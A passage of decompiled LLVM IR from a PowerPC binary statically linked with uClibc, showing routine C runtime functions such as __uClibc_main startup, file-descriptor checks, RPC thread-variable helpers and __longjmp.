  %v1_1000d6f0 = call i32 @__asm_rlwinm(i32 %v0_1000d6ec, i32 30, i32 31, i32 31)
  %v2_1000d6f4 = add i32 %v3_1000d6e8, %v1_1000d6f0
  store i32 %v2_1000d6f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d708

dec_label_pc_1000d6fc:                            ; preds = %dec_label_pc_1000d6d0, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d708

dec_label_pc_1000d704:                            ; preds = %dec_label_pc_1000d5b0, %dec_label_pc_1000d60c, %dec_label_pc_1000d58c
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000d708

dec_label_pc_1000d708:                            ; preds = %dec_label_pc_1000d6fc, %dec_label_pc_1000d6d8, %dec_label_pc_1000d638, %dec_label_pc_1000d704
  %v0_1000d718 = phi i32 [ 0, %dec_label_pc_1000d6fc ], [ %v2_1000d6f4, %dec_label_pc_1000d6d8 ], [ %v0_1000d718.pre, %dec_label_pc_1000d638 ], [ -1, %dec_label_pc_1000d704 ]
  ret i32 %v0_1000d718

; uselistorder directives
  uselistorder i32 %v1_1000d608, { 1, 0 }
  uselistorder i32 %v2_1000d5b0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1000d588, { 1, 0 }
  uselistorder i32 %v2_1000d56c, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 6, 8, 7, 0, 9, 3, 10, 11, 12, 23, 13, 14, 16, 17, 15, 18, 2, 19, 20, 5, 21, 22, 4, 1 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0, 3, 4, 7, 8, 9, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 0, 6, 7, 1, 2, 5, 8, 9, 3, 4 }
  uselistorder i32 (i32, i32)* @nanosleep, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d708, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000d704, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d6d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d6c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d5f8.dec_label_pc_1000d5f8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000d578.dec_label_pc_1000d578_crit_edge, { 1, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002c390.352 to i32)
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000d778:
  %v3_1000d77c = load i32, i32* @global_var_1002c3a0.354, align 4
  %v3_1000d780 = icmp eq i32 %v3_1000d77c, 0
  br i1 %v3_1000d780, label %dec_label_pc_1000d790, label %dec_label_pc_1000d788

dec_label_pc_1000d788:                            ; preds = %dec_label_pc_1000d778
  %v1_1000d78c = call i32 @unknown_0()
  store i32 %v1_1000d78c, i32* @r3, align 4
  br label %dec_label_pc_1000d790

dec_label_pc_1000d790:                            ; preds = %dec_label_pc_1000d778, %dec_label_pc_1000d788
  %v3_1000d794 = load i32, i32* @global_var_1002c3a4.355, align 4
  %v3_1000d798 = icmp eq i32 %v3_1000d794, 0
  br i1 %v3_1000d798, label %dec_label_pc_1000d790.dec_label_pc_1000d7a8_crit_edge, label %dec_label_pc_1000d7a0

dec_label_pc_1000d790.dec_label_pc_1000d7a8_crit_edge: ; preds = %dec_label_pc_1000d790
  %v0_1000d7b8.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d7a8

dec_label_pc_1000d7a0:                            ; preds = %dec_label_pc_1000d790
  %v1_1000d7a4 = call i32 @unknown_0()
  br label %dec_label_pc_1000d7a8

dec_label_pc_1000d7a8:                            ; preds = %dec_label_pc_1000d790.dec_label_pc_1000d7a8_crit_edge, %dec_label_pc_1000d7a0
  %v0_1000d7b8 = phi i32 [ %v0_1000d7b8.pre, %dec_label_pc_1000d790.dec_label_pc_1000d7a8_crit_edge ], [ %v1_1000d7a4, %dec_label_pc_1000d7a0 ]
  ret i32 %v0_1000d7b8

; uselistorder directives
  uselistorder i32 ()* @unknown_0, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1000d7a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000d790, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000d7c4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000d7c4
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268490732, i32* @lr, align 4
  %v2_1000d7e8 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000d7ec = icmp eq i32 %v2_1000d7e8, -1
  br i1 %v3_1000d7ec, label %dec_label_pc_1000d7f4, label %dec_label_pc_1000d814

dec_label_pc_1000d7f4:                            ; preds = %entry
  %v0_1000d7f8 = load i32, i32* @r30, align 4
  store i32 %v0_1000d7f8, i32* @r4, align 4
  store i32 268490760, i32* @lr, align 4
  %v0_1000d804 = call i32 @__libc_open()
  %v1_1000d808 = load i32, i32* @r31, align 4
  %v4_1000d808 = icmp eq i32 %v0_1000d804, %v1_1000d808
  br i1 %v4_1000d808, label %dec_label_pc_1000d814, label %dec_label_pc_1000d810

dec_label_pc_1000d810:                            ; preds = %dec_label_pc_1000d7f4
  %v1_1000d810 = call i32 @abort(i32 %v0_1000d804)
  br label %dec_label_pc_1000d814

dec_label_pc_1000d814:                            ; preds = %entry, %dec_label_pc_1000d7f4, %dec_label_pc_1000d810
  %v0_1000d824 = phi i32 [ %v2_1000d7e8, %entry ], [ %v0_1000d804, %dec_label_pc_1000d7f4 ], [ %v1_1000d810, %dec_label_pc_1000d810 ]
  ret i32 %v0_1000d824

; uselistorder directives
  uselistorder i32 ()* @__libc_open, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_1000d814, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000d848 = load i32, i32* @global_var_1002c3a8.357, align 4
  %v3_1000d84c = icmp eq i32 %v3_1000d848, 0
  br i1 %v3_1000d84c, label %dec_label_pc_1000d870, label %entry.dec_label_pc_1000d894_crit_edge

entry.dec_label_pc_1000d894_crit_edge:            ; preds = %entry
  %v0_1000d8a4.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000d894

dec_label_pc_1000d870:                            ; preds = %entry
  %v0_1000d828 = load i32, i32* @lr, align 4
  store i32 1, i32* @global_var_1002c3a8.357, align 4
  store i32 4096, i32* @global_var_1002c39c.149, align 4
  store i32 268490864, i32* @lr, align 4
  %v1_1000d86c = call i32 @__pthread_initialize_minimal(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v0_1000d828, i32* @lr, align 4
  %v1_1000d890 = call i32 @_stdio_init(i32 268475120)
  br label %dec_label_pc_1000d894

dec_label_pc_1000d894:                            ; preds = %entry.dec_label_pc_1000d894_crit_edge, %dec_label_pc_1000d870
  %v0_1000d8a4 = phi i32 [ %v0_1000d8a4.pre, %entry.dec_label_pc_1000d894_crit_edge ], [ %v1_1000d890, %dec_label_pc_1000d870 ]
  ret i32 %v0_1000d8a4

; uselistorder directives
  uselistorder label %dec_label_pc_1000d894, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000d8c0 = mul i32 %arg2, 4
  %v2_1000d8c4 = add i32 %tmp, %v1_1000d8c0
  %v0_1000d8c8 = load i32, i32* @r9, align 4
  store i32 %v0_1000d8c8, i32* @global_var_1002c394.358, align 4
  %v1_1000d8cc = add i32 %v2_1000d8c4, 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_1000d8cc, i32* @global_var_1002c398.351, align 4
  store i32 %arg6, i32* @global_var_1002c3a4.355, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000d8ec = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000d8f4 = icmp eq i32 %v1_1000d8cc, %v2_1000d8ec
  br i1 %v4_1000d8f4, label %dec_label_pc_1000d8fc, label %dec_label_pc_1000d900

dec_label_pc_1000d8fc:                            ; preds = %entry
  store i32 %v2_1000d8c4, i32* @global_var_1002c398.351, align 4
  br label %dec_label_pc_1000d900

dec_label_pc_1000d900:                            ; preds = %entry, %dec_label_pc_1000d8fc
  %v2_1000d900 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268491024, i32* @lr, align 4
  %v3_1000d90c = call i32 @__GI_memset(i32 %v2_1000d900, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002c398.351, align 4
  br label %dec_label_pc_1000d91c

dec_label_pc_1000d91c:                            ; preds = %dec_label_pc_1000d91c, %dec_label_pc_1000d900
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000d900 ], [ %v1_1000d920, %dec_label_pc_1000d91c ]
  %v1_1000d91c = inttoptr i32 %storemerge to i32*
  %v2_1000d91c = load i32, i32* %v1_1000d91c, align 4
  %v1_1000d920 = add i32 %storemerge, 4
  %v3_1000d924 = icmp eq i32 %v2_1000d91c, 0
  br i1 %v3_1000d924, label %dec_label_pc_1000d92c, label %dec_label_pc_1000d91c

dec_label_pc_1000d92c:                            ; preds = %dec_label_pc_1000d91c
  store i32 %v1_1000d920, i32* %r29.global-to-local, align 4
  %v1_1000d95812 = inttoptr i32 %v1_1000d920 to i32*
  %v2_1000d95813 = load i32, i32* %v1_1000d95812, align 4
  %v3_1000d95c16 = icmp eq i32 %v2_1000d95813, 0
  br i1 %v3_1000d95c16, label %dec_label_pc_1000d964, label %dec_label_pc_1000d934

dec_label_pc_1000d934:                            ; preds = %dec_label_pc_1000d92c, %dec_label_pc_1000d954
  %v0_1000d948 = phi i32 [ %v1_1000d954, %dec_label_pc_1000d954 ], [ %v1_1000d920, %dec_label_pc_1000d92c ]
  %v0_1000d93c = phi i32 [ %v2_1000d958, %dec_label_pc_1000d954 ], [ %v2_1000d95813, %dec_label_pc_1000d92c ]
  %v2_1000d934 = icmp ugt i32 %v0_1000d93c, 14
  br i1 %v2_1000d934, label %dec_label_pc_1000d954, label %dec_label_pc_1000d93c

dec_label_pc_1000d93c:                            ; preds = %dec_label_pc_1000d934
  %v1_1000d93c = mul i32 %v0_1000d93c, 8
  %v2_1000d944 = add i32 %v1_1000d93c, %v2_1000d900
  store i32 %v2_1000d944, i32* @r3, align 4
  store i32 %v0_1000d948, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268491092, i32* @lr, align 4
  %v0_1000d950 = call i32 @memcpy()
  %v0_1000d954.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000d954

dec_label_pc_1000d954:                            ; preds = %dec_label_pc_1000d934, %dec_label_pc_1000d93c
  %v0_1000d954 = phi i32 [ %v0_1000d948, %dec_label_pc_1000d934 ], [ %v0_1000d954.pre, %dec_label_pc_1000d93c ]
  %v1_1000d954 = add i32 %v0_1000d954, 8
  store i32 %v1_1000d954, i32* %r29.global-to-local, align 4
  %v1_1000d958 = inttoptr i32 %v1_1000d954 to i32*
  %v2_1000d958 = load i32, i32* %v1_1000d958, align 4
  %v3_1000d95c = icmp eq i32 %v2_1000d958, 0
  br i1 %v3_1000d95c, label %dec_label_pc_1000d964, label %dec_label_pc_1000d934

dec_label_pc_1000d964:                            ; preds = %dec_label_pc_1000d954, %dec_label_pc_1000d92c
  %v1_1000d968 = call i32 @_dl_aux_init(i32 %v2_1000d900)
  store i32 %v1_1000d968, i32* @r3, align 4
  store i32 268491120, i32* @lr, align 4
  %v1_1000d96c = call i32 @__GI___uClibc_init(i32 %v1_1000d968)
  %v3_1000d974 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000d974, label %dec_label_pc_1000d97c, label %dec_label_pc_1000d980

dec_label_pc_1000d97c:                            ; preds = %dec_label_pc_1000d964
  br label %dec_label_pc_1000d980

dec_label_pc_1000d980:                            ; preds = %dec_label_pc_1000d964, %dec_label_pc_1000d97c
  %v0_1000d988 = phi i32 [ %tmp27, %dec_label_pc_1000d964 ], [ 4096, %dec_label_pc_1000d97c ]
  store i32 %v0_1000d988, i32* @global_var_1002c39c.149, align 4
  %v3_1000d98c = icmp eq i32 %tmp26, -1
  br i1 %v3_1000d98c, label %dec_label_pc_1000d994, label %dec_label_pc_1000d9c8

dec_label_pc_1000d994:                            ; preds = %dec_label_pc_1000d980
  store i32 268491160, i32* @lr, align 4
  %v1_1000d994 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v1_1000d994, i32* %r29.global-to-local, align 4
  store i32 268491168, i32* @lr, align 4
  %v0_1000d99c = call i32 @geteuid()
  %v4_1000d9a0 = icmp eq i32 %v1_1000d994, %v0_1000d99c
  br i1 %v4_1000d9a0, label %dec_label_pc_1000d9a8, label %dec_label_pc_1000d9e4

dec_label_pc_1000d9a8:                            ; preds = %dec_label_pc_1000d994
  store i32 268491180, i32* @lr, align 4
  %v1_1000d9a8 = call i32 @getgid(i32 %v0_1000d99c)
  store i32 %v1_1000d9a8, i32* %r29.global-to-local, align 4
  store i32 268491188, i32* @lr, align 4
  %v0_1000d9b0 = call i32 @getegid()
  %v4_1000d9b4 = icmp eq i32 %v1_1000d9a8, %v0_1000d9b0
  br i1 %v4_1000d9b4, label %dec_label_pc_1000d9bc.thread, label %dec_label_pc_1000d9e4

dec_label_pc_1000d9bc.thread:                     ; preds = %dec_label_pc_1000d9a8
  br label %dec_label_pc_1000da14

dec_label_pc_1000d9c8:                            ; preds = %dec_label_pc_1000d980
  %v4_1000d9cc = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000d9cc, label %dec_label_pc_1000d9d4, label %dec_label_pc_1000d9e4

dec_label_pc_1000d9d4:                            ; preds = %dec_label_pc_1000d9c8
  br label %dec_label_pc_1000d9e4

dec_label_pc_1000d9e4:                            ; preds = %dec_label_pc_1000d9d4, %dec_label_pc_1000d9c8, %dec_label_pc_1000d9a8, %dec_label_pc_1000d994
  store i32 268491252, i32* @lr, align 4
  %v2_1000d9f0 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268491268, i32* @lr, align 4
  %v2_1000da00 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268491284, i32* @lr, align 4
  %v2_1000da10 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000da14

dec_label_pc_1000da14:                            ; preds = %dec_label_pc_1000d9bc.thread, %dec_label_pc_1000d9e4
  %v0_1000da20 = load i32, i32* @r30, align 4
  %v1_1000da20 = inttoptr i32 %v0_1000da20 to i32*
  %v2_1000da20 = load i32, i32* %v1_1000da20, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000da20, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32 -15672) to i32*), align 4
  %v0_1000da40 = load i32, i32* @r27, align 4
  store i32 %v0_1000da40, i32* @global_var_1002c3a0.354, align 4
  br i1 false, label %dec_label_pc_1000da48, label %dec_label_pc_1000dac0

dec_label_pc_1000da48:                            ; preds = %dec_label_pc_1000da14, %dec_label_pc_1000da48
  br i1 undef, label %dec_label_pc_1000da48, label %dec_label_pc_1000dac0

dec_label_pc_1000dac0:                            ; preds = %dec_label_pc_1000da48, %dec_label_pc_1000da14
  %v0_1000da6c = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000da6c)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_1000dad0 = call i32 @__errno_location()
  %v2_1000dad8 = inttoptr i32 %v0_1000dad0 to i32*
  store i32 0, i32* %v2_1000dad8, align 4
  %v1_1000daec = call i32 @__h_errno_location(i32 268447164)
  %v2_1000daf4 = inttoptr i32 %v1_1000daec to i32*
  store i32 0, i32* %v2_1000daf4, align 4
  %v0_1000db04 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000db04)
  %v0_1000db10 = call i32 @__GI_exit()
  ret i32 %v0_1000db10

; uselistorder directives
  uselistorder i32 %v2_1000d958, { 1, 0 }
  uselistorder i32 %v1_1000d954, { 2, 1, 0 }
  uselistorder i32 %v1_1000d920, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000d900, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000da48, { 1, 0 }
  uselistorder label %dec_label_pc_1000da14, { 1, 0 }
  uselistorder label %dec_label_pc_1000d980, { 1, 0 }
  uselistorder label %dec_label_pc_1000d954, { 1, 0 }
  uselistorder label %dec_label_pc_1000d934, { 1, 0 }
  uselistorder label %dec_label_pc_1000d900, { 1, 0 }
}

define i32 @rpc_thread_multi(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000db3c = call i32 @__pthread_internal_tsd_set(i32 2, i32 ptrtoint (i32* @global_var_10030b64.361 to i32), i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v3_1000db3c
}

define i32 @__rpc_thread_variables() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v2_1000db80 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268467256)
  %v3_1000db90 = icmp eq i32 %v2_1000db80, 0
  store i32 %v2_1000db80, i32* %r31.global-to-local, align 4
  br i1 %v3_1000db90, label %dec_label_pc_1000db9c, label %dec_label_pc_1000dc74

dec_label_pc_1000db9c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000dbc0.366 to i32), i32* @lr, align 4
  %v4_1000dbbc = call i32 @pthread_once(i32* nonnull @global_var_1002c3ac.365, i32 268491540, i32 268462308)
  %v2_1000dbf0 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268467256)
  %v3_1000dc00 = icmp eq i32 %v2_1000dbf0, 0
  store i32 %v2_1000dbf0, i32* %r31.global-to-local, align 4
  br i1 %v3_1000dc00, label %dec_label_pc_1000dc0c, label %dec_label_pc_1000dc74

dec_label_pc_1000dc0c:                            ; preds = %dec_label_pc_1000db9c
  store i32 268491800, i32* @lr, align 4
  %v2_1000dc14 = call i32 @calloc(i32 1, i32 200)
  store i32 %v2_1000dc14, i32* %r31.global-to-local, align 4
  %v3_1000dc18 = icmp eq i32 %v2_1000dc14, 0
  br i1 %v3_1000dc18, label %dec_label_pc_1000dc4c, label %dec_label_pc_1000dc20

dec_label_pc_1000dc20:                            ; preds = %dec_label_pc_1000dc0c
  %v3_1000dc38 = call i32 @__pthread_internal_tsd_set(i32 2, i32 %v2_1000dc14, i32 268467272)
  %v0_1000dc78.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dc74

dec_label_pc_1000dc4c:                            ; preds = %dec_label_pc_1000dc0c
  %v2_1000dc60 = call i32 @__pthread_internal_tsd_get(i32 2, i32 268467256)
  store i32 %v2_1000dc60, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000dc74

dec_label_pc_1000dc74:                            ; preds = %dec_label_pc_1000db9c, %entry, %dec_label_pc_1000dc20, %dec_label_pc_1000dc4c
  %v0_1000dc78 = phi i32 [ %v2_1000dbf0, %dec_label_pc_1000db9c ], [ %v2_1000db80, %entry ], [ %v0_1000dc78.pre, %dec_label_pc_1000dc20 ], [ %v2_1000dc60, %dec_label_pc_1000dc4c ]
  ret i32 %v0_1000dc78

; uselistorder directives
  uselistorder label %dec_label_pc_1000dc74, { 3, 2, 0, 1 }
}

define i32 @__rpc_thread_svc_max_pollfd() local_unnamed_addr {
entry:
  store i32 268491932, i32* @lr, align 4
  %v0_1000dc98 = call i32 @__rpc_thread_variables()
  %v4_1000dca4 = icmp eq i32 %v0_1000dc98, ptrtoint (i32* @global_var_10030b64.361 to i32)
  %v1_1000dca8 = add i32 %v0_1000dc98, 148
  br i1 %v4_1000dca4, label %dec_label_pc_1000dcb0, label %dec_label_pc_1000dcb8

dec_label_pc_1000dcb0:                            ; preds = %entry
  br label %dec_label_pc_1000dcb8

dec_label_pc_1000dcb8:                            ; preds = %entry, %dec_label_pc_1000dcb0
  %v0_1000dcc4 = phi i32 [ %v1_1000dca8, %entry ], [ ptrtoint (i32* @global_var_1002c3b8.371 to i32), %dec_label_pc_1000dcb0 ]
  ret i32 %v0_1000dcc4

; uselistorder directives
  uselistorder label %dec_label_pc_1000dcb8, { 1, 0 }
}

define i32 @__rpc_thread_svc_pollfd() local_unnamed_addr {
entry:
  store i32 268491992, i32* @lr, align 4
  %v0_1000dcd4 = call i32 @__rpc_thread_variables()
  %v4_1000dce0 = icmp eq i32 %v0_1000dcd4, ptrtoint (i32* @global_var_10030b64.361 to i32)
  %v1_1000dce4 = add i32 %v0_1000dcd4, 144
  br i1 %v4_1000dce0, label %dec_label_pc_1000dcec, label %dec_label_pc_1000dcf4

dec_label_pc_1000dcec:                            ; preds = %entry
  br label %dec_label_pc_1000dcf4

dec_label_pc_1000dcf4:                            ; preds = %entry, %dec_label_pc_1000dcec
  %v0_1000dd00 = phi i32 [ ptrtoint (i32* @global_var_1002c3bc.372 to i32), %dec_label_pc_1000dcec ], [ %v1_1000dce4, %entry ]
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_10030000.11 to i32), %dec_label_pc_1000dcec ], [ ptrtoint (i32* @global_var_10030b64.361 to i32), %entry ]
  store i32 %storemerge, i32* @r9, align 4
  ret i32 %v0_1000dd00

; uselistorder directives
  uselistorder label %dec_label_pc_1000dcf4, { 1, 0 }
}

define i32 @__GI___rpc_thread_createerr() local_unnamed_addr {
entry:
  store i32 268492052, i32* @lr, align 4
  %v0_1000dd10 = call i32 @__rpc_thread_variables()
  %v4_1000dd1c = icmp eq i32 %v0_1000dd10, ptrtoint (i32* @global_var_10030b64.361 to i32)
  %v1_1000dd20 = add i32 %v0_1000dd10, 128
  br i1 %v4_1000dd1c, label %dec_label_pc_1000dd28, label %dec_label_pc_1000dd30

dec_label_pc_1000dd28:                            ; preds = %entry
  br label %dec_label_pc_1000dd30

dec_label_pc_1000dd30:                            ; preds = %entry, %dec_label_pc_1000dd28
  %v0_1000dd3c = phi i32 [ %v1_1000dd20, %entry ], [ ptrtoint (i32* @global_var_10030d1c.373 to i32), %dec_label_pc_1000dd28 ]
  ret i32 %v0_1000dd3c

; uselistorder directives
  uselistorder label %dec_label_pc_1000dd30, { 1, 0 }
}

define i32 @__GI___rpc_thread_svc_fdset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268492112, i32* @lr, align 4
  %v0_1000dd4c = call i32 @__rpc_thread_variables()
  %v4_1000dd58 = icmp eq i32 %v0_1000dd4c, ptrtoint (i32* @global_var_10030b64.361 to i32)
  br i1 %v4_1000dd58, label %dec_label_pc_1000dd60, label %dec_label_pc_1000dd68

dec_label_pc_1000dd60:                            ; preds = %entry
  br label %dec_label_pc_1000dd68

dec_label_pc_1000dd68:                            ; preds = %entry, %dec_label_pc_1000dd60
  %v0_1000dd74 = phi i32 [ %v0_1000dd4c, %entry ], [ ptrtoint (i32* @global_var_10030c90.374 to i32), %dec_label_pc_1000dd60 ]
  ret i32 %v0_1000dd74

; uselistorder directives
  uselistorder label %dec_label_pc_1000dd68, { 1, 0 }
}

define i32 @__rpc_thread_destroy() local_unnamed_addr {
entry:
  %v2_1000dd9c = call i32 @__pthread_internal_tsd_get(i32 2, i32 268467256)
  store i32 %v2_1000dd9c, i32* @r31, align 4
  %v3_1000ddb0 = icmp eq i32 %v2_1000dd9c, 0
  %v4_1000ddbc = icmp eq i32 %v2_1000dd9c, ptrtoint (i32* @global_var_10030b64.361 to i32)
  %brmerge = or i1 %v4_1000ddbc, %v3_1000ddb0
  br i1 %brmerge, label %dec_label_pc_1000de30, label %dec_label_pc_1000ddc8

dec_label_pc_1000ddc8:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000ddcc.375 to i32), i32* @lr, align 4
  %v1_1000ddc8 = call i32 @__rpc_thread_svc_cleanup(i32 ptrtoint (i32* @global_var_10030b64.361 to i32))
  store i32 268492240, i32* @lr, align 4
  %v1_1000ddcc = call i32 @__rpc_thread_clnt_cleanup(i32 %v1_1000ddc8)
  %v0_1000ddd0 = load i32, i32* @r31, align 4
  %v1_1000ddd0 = add i32 %v0_1000ddd0, 152
  %v2_1000ddd0 = inttoptr i32 %v1_1000ddd0 to i32*
  %v3_1000ddd0 = load i32, i32* %v2_1000ddd0, align 4
  store i32 %v3_1000ddd0, i32* @r3, align 4
  store i32 268492248, i32* @lr, align 4
  %v0_1000ddd4 = call i32 @free()
  %v0_1000ddd8 = load i32, i32* @r31, align 4
  %v1_1000ddd8 = add i32 %v0_1000ddd8, 156
  %v2_1000ddd8 = inttoptr i32 %v1_1000ddd8 to i32*
  %v3_1000ddd8 = load i32, i32* %v2_1000ddd8, align 4
  store i32 %v3_1000ddd8, i32* @r3, align 4
  store i32 268492256, i32* @lr, align 4
  %v0_1000dddc = call i32 @free()
  %v0_1000dde0 = load i32, i32* @r31, align 4
  %v1_1000dde0 = add i32 %v0_1000dde0, 160
  %v2_1000dde0 = inttoptr i32 %v1_1000dde0 to i32*
  %v3_1000dde0 = load i32, i32* %v2_1000dde0, align 4
  store i32 %v3_1000dde0, i32* @r3, align 4
  store i32 268492264, i32* @lr, align 4
  %v0_1000dde4 = call i32 @free()
  %v0_1000dde8 = load i32, i32* @r31, align 4
  %v1_1000dde8 = add i32 %v0_1000dde8, 188
  %v2_1000dde8 = inttoptr i32 %v1_1000dde8 to i32*
  %v3_1000dde8 = load i32, i32* %v2_1000dde8, align 4
  store i32 %v3_1000dde8, i32* @r3, align 4
  store i32 268492272, i32* @lr, align 4
  %v0_1000ddec = call i32 @free()
  %v0_1000ddf0 = load i32, i32* @r31, align 4
  %v1_1000ddf0 = add i32 %v0_1000ddf0, 172
  %v2_1000ddf0 = inttoptr i32 %v1_1000ddf0 to i32*
  %v3_1000ddf0 = load i32, i32* %v2_1000ddf0, align 4
  store i32 %v3_1000ddf0, i32* @r3, align 4
  store i32 268492280, i32* @lr, align 4
  %v0_1000ddf4 = call i32 @free()
  %v0_1000ddf8 = load i32, i32* @r31, align 4
  %v1_1000ddf8 = add i32 %v0_1000ddf8, 176
  %v2_1000ddf8 = inttoptr i32 %v1_1000ddf8 to i32*
  %v3_1000ddf8 = load i32, i32* %v2_1000ddf8, align 4
  store i32 %v3_1000ddf8, i32* @r3, align 4
  store i32 268492288, i32* @lr, align 4
  %v0_1000ddfc = call i32 @free()
  %v0_1000de00 = load i32, i32* @r31, align 4
  store i32 %v0_1000de00, i32* @r3, align 4
  store i32 268492296, i32* @lr, align 4
  %v0_1000de04 = call i32 @free()
  %v3_1000de20 = call i32 @__pthread_internal_tsd_set(i32 2, i32 0, i32 268435456)
  br label %dec_label_pc_1000de30

dec_label_pc_1000de30:                            ; preds = %entry, %dec_label_pc_1000ddc8
  %v0_1000de40 = phi i32 [ %v2_1000dd9c, %entry ], [ %v3_1000de20, %dec_label_pc_1000ddc8 ]
  ret i32 %v0_1000de40

; uselistorder directives
  uselistorder i32 %v2_1000dd9c, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__pthread_internal_tsd_set, { 1, 2, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10030b64.361 to i32), { 1, 3, 4, 5, 0, 6, 7, 2 }
  uselistorder i32 (i32, i32)* @__pthread_internal_tsd_get, { 0, 3, 2, 1 }
  uselistorder i32 268467256, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000de30, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000de44 = load i32, i32* @lr, align 4
  %v0_1000de50 = load i32, i32* @r3, align 4
  store i32 %v0_1000de50, i32* @r29, align 4
  %v0_1000de58 = call i32 @__errno_location()
  %v0_1000de5c = load i32, i32* @r29, align 4
  %v2_1000de5c = inttoptr i32 %v0_1000de58 to i32*
  store i32 %v0_1000de5c, i32* %v2_1000de5c, align 4
  store i32 %v0_1000de44, i32* @lr, align 4
  ret i32 -1
}

define i32 @__longjmp(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1000ded0 = add i32 %tmp, 84
  %v2_1000ded0 = inttoptr i32 %v1_1000ded0 to i32*
  %v3_1000ded0 = load i32, i32* %v2_1000ded0, align 4
  %v1_1000deec = call %0 @__asm_mtcrf(i32 255, i32 %v3_1000ded0)
  ret i32 %arg2
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000df30 = load i32, i32* @lr, align 4
